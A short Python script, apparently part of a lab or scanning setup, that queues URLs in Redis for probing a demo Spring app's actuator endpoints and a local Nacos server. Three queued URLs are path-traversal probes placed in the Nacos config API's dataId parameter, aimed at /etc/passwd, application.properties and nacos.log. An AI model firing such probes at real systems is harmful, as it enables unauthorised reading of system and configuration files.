# scheduler.py
import redis, json, time

r = redis.Redis(host="localhost", port=6379, db=0)

tasks = [
    {"url": "http://demo-app:8080/actuator/health", "name": "demo-health"},
    {"url": "http://demo-app:8080/actuator/info", "name": "demo-info"},
    {"url": "http://demo-app:8080/actuator/env", "name": "demo-env"},
    {"url": "http://localhost:8848/nacos/v1/cs/configs", "name": "nacos-configs"},
    {"url": "http://localhost:8848/nacos", "name": "nacos-console"},
    # Path traversal/file read probes for Nacos config API
    {"url": "http://localhost:8848/nacos/v1/cs/configs?dataId=../../../../../etc/passwd&group=DEFAULT_GROUP", "name": "nacos-etc-passwd"},
    {"url": "http://localhost:8848/nacos/v1/cs/configs?dataId=../conf/application.properties&group=DEFAULT_GROUP", "name": "nacos-app-props"},
    {"url": "http://localhost:8848/nacos/v1/cs/configs?dataId=../logs/nacos.log&group=DEFAULT_GROUP", "name": "nacos-log-file"}
]

print("Pushing tasks to redis queue 'tasks' ...")
for t in tasks:
    r.rpush("tasks", json.dumps(t))
    print("Pushed:", t)
    time.sleep(0.1)

print("Done.")
